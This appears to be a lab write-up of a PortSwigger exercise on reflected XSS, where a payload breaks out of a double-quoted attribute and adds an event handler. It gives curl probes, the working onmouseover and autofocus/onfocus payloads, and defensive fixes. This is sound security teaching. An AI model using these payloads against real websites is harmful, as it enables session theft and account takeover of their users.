---
title: "Reflected XSS into attribute with angle brackets HTML-encoded"
date: 2026-08-27 09:00:00 -0500
categories: [PortSwigger, Cross-site-scripting]
tags: [portswigger, cwe-79, xss, reflected, attribute-context, event-handler, javascript]
description: "Angle brackets are HTML-encoded so a <script> tag can't be injected — but the input lands inside a double-quoted attribute and the quote isn't encoded. Break out of the attribute and add your own event handler instead. One missed character is the whole bug."
image:
    path: /assets/Images/PortSwigger-avatar.png
    alt: Reflected XSS into attribute with angle brackets HTML-encoded
---

## Overview

This [cross-site scripting](https://cwe.mitre.org/data/definitions/79.html) ([CWE-79](https://cwe.mitre.org/data/definitions/79.html)) lab adds one defence the "nothing encoded" case lacked: angle brackets are HTML-encoded, so you **cannot** inject a new `<script>` tag — `<` comes back as `&lt;`. The catch is *where* the input lands. It is reflected inside a double-quoted HTML attribute, and the developer forgot to encode the double-quote. That single missed character lets you break out of the attribute and add your own JavaScript event handler — no angle brackets required.

## The technique

XSS is context-dependent: the payload that fires depends entirely on where in the HTML your input ends up. Here it lands inside a tag attribute:

```html
<input type=text placeholder='Search the blog...' name=search value="YOUR-INPUT">
```

A bare `<script>` can't work in two ways: it's stuck inside a quoted attribute, *and* the angle brackets are encoded anyway. But there's a second way to run JavaScript from inside a tag that needs no angle brackets at all — **HTML event-handler attributes** (`onmouseover`, `onfocus`, `onclick`, ...). If you can end the `value="..."` attribute early and start a new one, you can add an event handler that runs script. Ending the attribute only needs a double-quote — and the double-quote is reflected un-encoded.

## Solution

**Step 1 — read the context.** Reflect a benign marker and look at how it comes back:

```bash
curl -sk -G "https://<lab-instance>.web-security-academy.net/" \
  --data-urlencode "search=zzqraprobe"
```

```html
<input type=text placeholder='Search the blog...' name=search value="zzqraprobe">
```

The input lands inside `value="..."`. Send a `"` to check whether it survives — it does (only `<`/`>` get encoded), which means an attribute breakout is on the table.

**Step 2 — break out and add an event handler.** Use this search term:

```
"onmouseover="alert(1)
```

```bash
curl -sk -G "https://<lab-instance>.web-security-academy.net/" \
  --data-urlencode 'search="onmouseover="alert(1)'
```

The server reflects it straight into the tag:

```html
<input type=text placeholder='Search the blog...' name=search value=""onmouseover="alert(1)">
```

Read it the way the browser does:

- `value=""` — your first `"` closes the original (now empty) value.
- `onmouseover="alert(1)"` — a brand-new event-handler attribute the browser treats as legitimate.
- The leftover trailing `"` from the original markup rebalances the quoting so the tag stays well-formed.

When a user moves the mouse over the search box, `alert(1)` runs and the lab flips to **Solved**.

A common variant that needs **no** user interaction:

```
" autofocus onfocus=alert(1) x="
```

`autofocus` makes the browser focus the field on load and `onfocus` fires immediately — the alert runs with no hover needed. The trailing `x="` swallows the original closing quote so the tag stays valid.

## Why it worked

The application built the attribute by concatenating user input between two quotes, and the output encoding was *partial* — angle brackets were escaped but the quote character was not. Encoding has to neutralize **every** character that's special in the current context. Inside a double-quoted attribute the dangerous character is the double-quote: leave it un-encoded and the attacker can close the attribute and inject new ones, pivoting from "controls text" to "controls markup" without ever touching a `<`.

## Real-world impact

`alert(1)` is only a proof of execution. The same breakout runs arbitrary JavaScript in the victim's session and origin — stealing a non-`HttpOnly` session cookie, performing authenticated actions, keylogging, or chaining to account takeover. Reflected XSS is delivered by luring the victim to a crafted link (phishing, a malicious ad, a planted post).

## Fix / defense

- **Encode for the attribute context** — HTML-entity-encode quotes (`"` → `&quot;`, `'` → `&#x27;`) as well as angle brackets whenever input is reflected into an attribute. Escaping only `<`/`>` is incomplete.
- **Use a framework that auto-escapes by default** (React, Angular, Jinja2/Twig autoescape, Rails `h()`) and prefer setting attributes via safe DOM APIs over string concatenation.
- **Content-Security-Policy** as defense-in-depth — `unsafe-inline`-free policies stop inline event handlers from executing even if one is injected.
- **HttpOnly + SameSite cookies** to blunt the session-theft escalation.
